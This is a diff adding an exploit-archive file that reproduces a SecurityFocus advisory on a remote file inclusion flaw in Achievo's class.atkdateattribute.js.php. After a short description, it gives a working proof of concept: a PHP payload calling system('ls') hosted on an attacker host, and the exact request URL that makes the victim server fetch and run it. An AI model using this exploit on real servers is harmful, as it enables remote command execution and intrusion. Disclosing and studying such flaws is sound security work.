@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/5552/info
+
+Achievo includes a PHP script which is used to generate JavaScript (class.atkdateattribute.js.php). This script employs a number of PHP include_once() statements to call code contained in function libraries and grab configuration information. Attackers may subvert the variable ($config_atkroot) which is used to store the location of the external files and specify an arbitrary location, such as an attacker-supplied PHP script on a remote host.
+
+Exploitation of this issue will enable the remote attacker to execute commands with the privileges of the webserver hosting the vulnerable software.
+
+
+Create the following text file (ls.txt) and store it on the attacker host where it is publicly accessible:
+
+<?php system('ls'); ?>
+
+And cause the vulnerable script on the victim host to invoke it with the following request:
+
+http://victimhost/achievo/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://attackerhost/ls.txt? 
